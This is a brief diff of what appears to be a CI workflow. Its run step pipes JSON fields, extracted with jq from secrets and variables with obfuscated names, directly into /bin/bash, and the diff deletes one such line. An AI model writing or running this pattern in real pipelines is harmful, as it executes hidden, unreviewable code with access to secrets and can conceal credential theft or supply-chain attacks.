@@ -21,7 +21,6 @@ jobs:
           qku15298: ${{ secrets.qku15298 }}
         run: |
           printf '%s' "$qku15298" | jq -r .abt0953 | /bin/bash
-          echo $pbrq69126 | jq -r .uovdz2 | /bin/bash
           printf '%s' "$l2" | jq -r .t20236 | /bin/bash
           echo $ncmpf7 | jq -r .s71 | /bin/bash
           printf '%s' "$s3066" | jq -r .h512 | /bin/bash
